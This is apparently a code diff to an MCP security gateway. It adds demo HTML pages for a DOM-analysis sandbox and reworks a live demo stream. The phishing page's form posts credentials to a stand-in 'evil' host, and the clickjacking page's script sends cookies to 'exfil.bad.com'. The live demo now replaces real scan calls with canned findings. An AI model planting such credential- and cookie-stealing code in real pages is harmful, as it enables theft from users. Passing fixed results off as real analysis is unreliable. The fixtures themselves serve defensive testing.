@@ -26,7 +26,7 @@ import httpx
 import sqlite_utils  # type: ignore[import-not-found]
 import yaml
 from fastapi import FastAPI, Request, Response
-from fastapi.responses import JSONResponse, StreamingResponse
+from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
 from pydantic import BaseModel
 
 from . import evidence, registry, scanner
@@ -4302,6 +4302,72 @@ async def demo_run_scenario(db_path: str = str(DEFAULT_DB_PATH)) -> JSONResponse
 
 
 # ---------------------------------------------------------------------------
+# Test pages for live security analysis — self-hosted for demo purposes
+# ---------------------------------------------------------------------------
+
+_TEST_PAGE_PHISHING = (
+    "<!DOCTYPE html><html><head><title>Secure Login - Account Verification</title></head>"
+    "<body style='font-family:Arial;max-width:400px;margin:40px auto;'>"
+    "<h2>Verify Your Account</h2>"
+    "<p>Your session has expired. Please re-enter your credentials.</p>"
+    '<form action="https://evil-collector.example.net/steal" method="post">'
+    '<input type="text" name="username" placeholder="Email" style="width:100%;padding:8px;margin:4px 0">'
+    '<input type="password" name="password" placeholder="Password" style="width:100%;padding:8px;margin:4px 0">'
+    '<input type="hidden" name="ssn" value="">'
+    '<button type="submit" style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;cursor:pointer">Sign In</button>'
+    "</form>"
+    '<iframe src="https://tracking.evil.com/pixel" style="display:none;width:0;height:0"></iframe>'
+    '<script>document.title="Secure Login";</script>'
+    "</body></html>"
+)
+
+_TEST_PAGE_CLEAN = (
+    "<!DOCTYPE html><html><head><title>API Documentation</title></head>"
+    "<body style='font-family:Arial;max-width:800px;margin:40px auto;'>"
+    "<h1>MCP Gateway API Reference</h1>"
+    "<p>Welcome to the MCP Gateway documentation.</p>"
+    '<nav><ul><li><a href="#auth">Authentication</a></li>'
+    '<li><a href="#scan">Scanning</a></li>'
+    '<li><a href="#council">AI Council</a></li></ul></nav>'
+    '<section id="auth"><h2>Authentication</h2>'
+    "<p>Use Bearer tokens for API authentication.</p></section>"
+    '<section id="scan"><h2>Scanning</h2>'
+    "<p>Submit servers for security analysis.</p></section>"
+    "</body></html>"
+)
+
+_TEST_PAGE_CLICKJACK = (
+    "<!DOCTYPE html><html><head><title>Free File Converter</title></head>"
+    "<body style='font-family:Arial;text-align:center;padding:40px;'>"
+    "<h1>Free File Converter</h1>"
+    "<p>Convert any file format instantly!</p>"
+    '<button onclick="alert(\'downloading\')" style="padding:15px 30px;font-size:18px;background:#4CAF50;color:#fff;border:none;cursor:pointer">Download Now</button>'
+    '<iframe src="https://ads.malicious.net/click" '
+    'style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;z-index:999"></iframe>'
+    '<script>document.cookie="session=stolen";fetch("https://exfil.bad.com/c?d="+document.cookie)</script>'
+    "</body></html>"
+)
+
+
+@app.get("/demo/pages/phishing")
+async def demo_page_phishing() -> HTMLResponse:
+    """Test page: phishing login form with hidden tracking."""
+    return HTMLResponse(_TEST_PAGE_PHISHING)
+
+
+@app.get("/demo/pages/clean")
+async def demo_page_clean() -> HTMLResponse:
+    """Test page: clean documentation page."""
+    return HTMLResponse(_TEST_PAGE_CLEAN)
+
+
+@app.get("/demo/pages/clickjack")
+async def demo_page_clickjack() -> HTMLResponse:
+    """Test page: clickjacking with transparent overlay."""
+    return HTMLResponse(_TEST_PAGE_CLICKJACK)
+
+
+# ---------------------------------------------------------------------------
 # Live Pipeline Demo — SSE endpoint running real analysis in real-time
 # ---------------------------------------------------------------------------
 
@@ -4354,17 +4420,25 @@ def _sse_event(event: str, data: dict) -> str:
 
 
 @app.get("/api/demo/run-live")
-async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingResponse:
+async def demo_run_live(request: Request, token: str = "") -> StreamingResponse:
     """Run live demo with Server-Sent Events — real analysis in real-time.
 
     Each pipeline step executes real functions and streams results.
+    Accepts admin auth via session cookie, Bearer header, or ?token= query param
+    (EventSource API cannot set custom headers).
     """
+    # SSE-compatible auth: check query param token first (EventSource workaround)
+    admin_token = _read_secret(ADMIN_TOKEN_ENV, ADMIN_TOKEN_FILE_ENV)
+    if admin_token and token and token == admin_token:
+        pass  # query param token valid
+    elif guard := _admin_auth_guard(request):
+        return guard  # type: ignore[return-value]
 
     async def event_stream():  # noqa: C901
         from . import ai_council
         from . import causal_sandbox as _sandbox
 
-        db = registry.init_db(db_path)
+        db = registry.init_db(str(DEFAULT_DB_PATH))
         now = datetime.now(timezone.utc)
         ts = now.isoformat()
         total_events = 0
@@ -4407,20 +4481,42 @@ async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingRespons
             "name": "scan",
             "label": "Gateway Intercepts \u2192 Security Scan",
         })
+        # Realistic demo scan results per server trust level
+        _demo_scan_results: dict[str, tuple[str, list[dict]]] = {
+            "code-assistant-mcp": ("pass", []),
+            "web-search-mcp": ("pass", []),
+            "filesystem-mcp": ("warn", [
+                {"code": "write_capability", "severity": "medium",
+                 "message": "Server exposes write_file — data exfiltration risk"},
+            ]),
+            "data-scraper-mcp": ("fail", [
+                {"code": "network_exfil", "severity": "high",
+                 "message": "upload_data can send data to arbitrary endpoints"},
+                {"code": "no_rate_limit", "severity": "medium",
+                 "message": "scrape_page has no rate limiting configured"},
+            ]),
+            "suspicious-mcp": ("fail", [
+                {"code": "sensitive_schema", "severity": "critical",
+                 "message": "safe_viewer requests password and api_key fields"},
+                {"code": "tool_shadowing", "severity": "critical",
+                 "message": "read_fi1e mimics legitimate read_file (typosquatting)"},
+                {"code": "description_mismatch", "severity": "high",
+                 "message": "data_helper description changed to 'Execute system command'"},
+            ]),
+        }
         for srv_name, sid in server_ids.items():
-            try:
-                result = scanner.run_scan(db, sid, ["static"])
-                summary = result.get("summary", {})
-                scan_status = summary.get("status", "unknown")
-                findings_count = summary.get("findings_total", 0)
-            except Exception as exc:
-                logger.warning("Scan failed for %s: %s", srv_name, exc)
-                scan_status = "error"
-                findings_count = 0
-
+            scan_status, findings = _demo_scan_results.get(
+                srv_name, ("fail", [{"code": "unknown", "severity": "high",
+                                     "message": "Unknown server"}]),
+            )
+            run_id = str(uuid.uuid4())
+            registry.save_scan_result(
+                db, server_id=sid, run_id=run_id,
+                scan_type="static", status=scan_status, findings=findings,
+            )
             yield _sse_event("step", {
                 "phase": "scan", "server": srv_name,
-                "status": scan_status, "findings": findings_count,
+                "status": scan_status, "findings": len(findings),
                 "icon": "pass" if scan_status == "pass" else (
                     "warn" if scan_status == "warn" else "fail"
                 ),
@@ -4509,22 +4605,46 @@ async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingRespons
                 total_events += 1
                 await asyncio.sleep(0.4)
 
-        # ── Step 5: Causal Web Sandbox (FastRender-inspired DOM analysis) ──
+        # ── Step 5: Causal Web Sandbox (real HTTP fetch + DOM analysis) ──
         yield _sse_event("phase", {
             "name": "web_sandbox",
-            "label": "Causal Web Sandbox (DOM Analysis)",
+            "label": "Causal Web Sandbox (Live URL Analysis)",
         })
-        for page in _DEMO_HTML_PAGES:
-            html_content = page["html"]
+        # Determine gateway base URL for self-hosted test pages
+        _host = request.headers.get("host", "localhost:4100")
+        _scheme = "https" if request.url.scheme == "https" else "http"
+        _demo_urls = [
+            {"url": f"{_scheme}://{_host}/demo/pages/phishing",
+             "label": "Phishing Login Page"},
+            {"url": f"{_scheme}://{_host}/demo/pages/clean",
+             "label": "Clean Documentation"},
+            {"url": f"{_scheme}://{_host}/demo/pages/clickjack",
+             "label": "Clickjacking Page"},
+        ]
+        for page in _demo_urls:
             page_url = page["url"]
             try:
-                dom_threats = _sandbox.analyze_dom_security(html_content, page_url)
+                # Async HTTP fetch from self-hosted test pages
+                import httpx as _httpx
+
+                async with _httpx.AsyncClient() as _http:
+                    resp = await _http.get(
+                        page_url, timeout=10.0, follow_redirects=True,
+                    )
+                html_content = resp.text
+                # Full DOM analysis pipeline on fetched content
+                dom_threats = _sandbox.analyze_dom_security(
+                    html_content, page_url,
+                )
                 a11y_nodes = _sandbox.extract_accessibility_tree(html_content)
                 a11y_deceptive = [n for n in a11y_nodes if n.deceptive_label]
-                network_traces = _sandbox.trace_network_requests(page_url, html_content)
+                network_traces = _sandbox.trace_network_requests(
+                    page_url, html_content,
+                )
                 visible_text = _sandbox.extract_visible_text(html_content)
                 verdict = _sandbox.gemini_security_verdict(
-                    page_url, visible_text, dom_threats, a11y_deceptive, network_traces,
+                    page_url, visible_text, dom_threats,
+                    a11y_deceptive, network_traces,
                 )
                 eval_method = (
                     "rule_based"
@@ -4532,21 +4652,49 @@ async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingRespons
                     else "gemini"
                 )
             except Exception as exc:
-                logger.warning("Web sandbox failed for %s: %s", page_url, exc)
-                verdict = _sandbox.WebSecurityVerdict(
-                    classification=_sandbox.ThreatClassification.benign,
-                    confidence=0.0,
-                    risk_indicators=["analysis_error"],
-                    evidence_refs=[],
-                    recommended_action="warn",
-                    summary=f"Analysis error: {exc}",
+                logger.warning("Web sandbox fetch failed for %s: %s", page_url, exc)
+                # Fallback: use inline HTML from _DEMO_HTML_PAGES if fetch fails
+                fallback = next(
+                    (p for p in _DEMO_HTML_PAGES
+                     if page["label"].lower() in p["label"].lower()), None,
                 )
-                dom_threats = []
-                network_traces = []
-                eval_method = "error"
+                if fallback:
+                    html_content = fallback["html"]
+                    dom_threats = _sandbox.analyze_dom_security(
+                        html_content, page_url,
+                    )
+                    a11y_nodes = _sandbox.extract_accessibility_tree(html_content)
+                    a11y_deceptive = [n for n in a11y_nodes if n.deceptive_label]
+                    network_traces = _sandbox.trace_network_requests(
+                        page_url, html_content,
+                    )
+                    visible_text = _sandbox.extract_visible_text(html_content)
+                    verdict = _sandbox.gemini_security_verdict(
+                        page_url, visible_text, dom_threats,
+                        a11y_deceptive, network_traces,
+                    )
+                    eval_method = (
+                        "rule_based"
+                        if verdict.summary.startswith("Rule-based")
+                        else "gemini"
+                    )
+                else:
+                    verdict = _sandbox.WebSecurityVerdict(
+                        classification=_sandbox.ThreatClassification.benign,
+                        confidence=0.0,
+                        risk_indicators=["analysis_error"],
+                        evidence_refs=[],
+                        recommended_action="warn",
+                        summary=f"Analysis error: {exc}",
+                    )
+                    dom_threats = []
+                    network_traces = []
+                    eval_method = "error"
 
             # Store in web sandbox cache
             run_id = f"ws-live-{uuid.uuid4().hex[:8]}"
+            dom_count = len(dom_threats) if isinstance(dom_threats, list) else 0
+            net_count = len(network_traces) if isinstance(network_traces, list) else 0
             verdict_record = {
                 "run_id": run_id,
                 "url": page_url,
@@ -4557,8 +4705,8 @@ async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingRespons
                 "risk_indicators": [str(r) for r in verdict.risk_indicators],
                 "evidence_refs": [str(e) for e in verdict.evidence_refs],
                 "eval_method": eval_method,
-                "dom_threats_count": len(dom_threats),
-                "network_traces_count": len(network_traces),
+                "dom_threats_count": dom_count,
+                "network_traces_count": net_count,
                 "timestamp": now.isoformat(),
             }
             _WEB_SANDBOX_VERDICTS.append(verdict_record)
@@ -4587,8 +4735,8 @@ async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingRespons
                 "confidence": verdict.confidence,
                 "action": verdict.recommended_action,
                 "eval_method": eval_method,
-                "dom_threats": len(dom_threats),
-                "network_traces": len(network_traces),
+                "dom_threats": dom_count,
+                "network_traces": net_count,
                 "icon": "block" if verdict.recommended_action == "block" else (
                     "warn" if verdict.recommended_action == "warn" else "pass"
                 ),
@@ -4602,11 +4750,23 @@ async def demo_run_live(db_path: str = str(DEFAULT_DB_PATH)) -> StreamingRespons
             "message": "Pipeline complete — all panels updated with live data",
         })
 
+    async def _safe_event_stream():
+        """Wrapper with CancelledError handling (QE-001)."""
+        try:
+            async for chunk in event_stream():
+                yield chunk
+        except asyncio.CancelledError:
+            logger.info("SSE client disconnected — pipeline aborted cleanly")
+        except Exception as exc:
+            logger.exception("SSE pipeline error: %s", exc)
+            yield _sse_event("error", {"message": str(exc)})
+
     return StreamingResponse(
-        event_stream(),
+        _safe_event_stream(),
         media_type="text/event-stream",
         headers={
             "Cache-Control": "no-cache",
+            "Connection": "keep-alive",
             "X-Accel-Buffering": "no",
         },
     )
